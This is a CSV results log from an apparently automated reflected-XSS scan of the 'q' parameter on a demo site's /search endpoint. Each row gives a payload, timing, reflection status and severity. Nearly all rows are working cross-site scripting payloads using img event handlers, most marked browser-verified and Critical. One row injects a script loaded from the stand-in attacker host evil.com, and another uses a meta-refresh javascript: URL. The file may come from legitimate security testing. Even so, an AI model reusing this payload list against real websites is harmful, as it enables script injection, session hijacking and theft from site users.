Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:53.834,2026-01-10 17:58:53.950,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.830,2026-01-10 17:58:53.951,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.845,2026-01-10 17:58:53.957,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:51.044,2026-01-10 17:58:53.982,2.938,https://demo-knsl.onrender.com/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 17:58:53.908,2026-01-10 17:58:54.016,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.935,2026-01-10 17:58:54.050,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.937,2026-01-10 17:58:54.057,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.957,2026-01-10 17:58:54.072,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.950,2026-01-10 17:58:54.073,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.941,2026-01-10 17:58:54.081,0.140,https://demo-knsl.onrender.com/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.982,2026-01-10 17:58:54.108,0.126,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.016,2026-01-10 17:58:54.132,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.050,2026-01-10 17:58:54.162,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.057,2026-01-10 17:58:54.168,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.072,2026-01-10 17:58:54.182,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.073,2026-01-10 17:58:54.184,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.081,2026-01-10 17:58:54.195,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.108,2026-01-10 17:58:54.223,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.462,2026-01-10 17:58:54.237,0.774,https://demo-knsl.onrender.com/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,No,,High
2026-01-10 17:58:54.132,2026-01-10 17:58:54.270,0.137,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.162,2026-01-10 17:58:54.283,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.182,2026-01-10 17:58:54.290,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.184,2026-01-10 17:58:54.292,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.195,2026-01-10 17:58:54.300,0.106,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.223,2026-01-10 17:58:54.348,0.124,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.237,2026-01-10 17:58:54.348,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.270,2026-01-10 17:58:54.388,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.283,2026-01-10 17:58:54.391,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.292,2026-01-10 17:58:54.407,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.290,2026-01-10 17:58:54.407,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.300,2026-01-10 17:58:54.416,0.115,https://demo-knsl.onrender.com/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.348,2026-01-10 17:58:54.461,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.348,2026-01-10 17:58:54.466,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.388,2026-01-10 17:58:54.514,0.126,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.407,2026-01-10 17:58:54.514,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.407,2026-01-10 17:58:54.518,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.391,2026-01-10 17:58:54.523,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.416,2026-01-10 17:58:54.533,0.118,https://demo-knsl.onrender.com/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.704,2026-01-10 17:58:54.561,0.857,https://demo-knsl.onrender.com/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:54.466,2026-01-10 17:58:54.587,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.461,2026-01-10 17:58:54.589,0.128,https://demo-knsl.onrender.com/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.514,2026-01-10 17:58:54.660,0.146,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.518,2026-01-10 17:58:54.661,0.143,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.533,2026-01-10 17:58:54.666,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.561,2026-01-10 17:58:54.672,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.514,2026-01-10 17:58:54.672,0.158,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.587,2026-01-10 17:58:54.701,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.589,2026-01-10 17:58:54.737,0.148,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.661,2026-01-10 17:58:54.775,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.660,2026-01-10 17:58:54.782,0.122,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.666,2026-01-10 17:58:54.783,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.672,2026-01-10 17:58:54.788,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.672,2026-01-10 17:58:54.792,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
